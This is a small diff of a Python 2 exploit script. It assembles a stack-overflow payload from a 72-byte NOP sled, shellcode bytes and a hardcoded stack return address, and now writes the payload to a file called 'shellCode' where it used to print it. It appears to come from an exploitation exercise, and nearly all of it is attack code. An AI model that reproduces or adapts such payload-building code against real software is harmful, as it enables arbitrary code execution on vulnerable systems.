@@ -12,7 +12,12 @@ buf += "\xe0\x38\x48\xc1\xe8\x38\x0f\x05"
 
 return_address = "\x10\xdd\xff\xff\xff\x7f"
 
-print '\x90' * 72 + buf + return_address
+buf = '\x90' * 72 + buf + return_address
+
+f = open("shellCode", "w")
+f.write(buf)
+f.close()
+
 #print "\x90" * 87 + buf + return_address
 #[::-1]
 
